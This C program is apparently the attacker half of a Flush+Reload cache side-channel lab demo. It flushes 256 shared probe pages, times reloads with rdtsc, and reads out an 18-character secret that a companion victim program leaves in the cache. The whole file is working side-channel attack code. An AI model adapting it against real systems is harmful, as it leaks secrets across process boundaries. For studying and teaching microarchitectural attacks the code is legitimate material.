#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <x86intrin.h>
#include "common.h"
#include "shared.h"

int main(void)
{
    int fd = open(SHARED_FILE, O_RDWR);
    uint8_t *probe = mmap(NULL,
                          SHARED_SIZE,
                          PROT_READ | PROT_WRITE,
                          MAP_SHARED,
                          fd, 0);
    close(fd);

    char recovered[64] = {0};

    for (int pos = 0; pos < 18; pos++)
    {
        for (int i = 0; i < 256; i++)
            _mm_clflush(probe + i * PAGE_SIZE);

        usleep(1500);

        int best = -1;
        uint64_t best_time = ~0ULL;

        for (int i = 0; i < 256; i++)
        {
            volatile uint8_t *addr = probe + i * PAGE_SIZE;
            uint64_t t1 = rdtsc_begin();
            (void)*addr;
            uint64_t dt = rdtsc_end() - t1;

            // printf("%d-th page : addr: %p, delay: %d\n", i, (void *)addr, dt);
            if (dt < best_time)
            {
                best_time = dt;
                best = i;
            }
        }

        recovered[pos] = (char)best;
        printf("[Attacker] Leaked[%d] = '%c' (lat=%lu)\n",
               pos, recovered[pos], best_time);
    }

    printf("\n[Attacker] Recovered secret: %s\n", recovered);
    return 0;
}
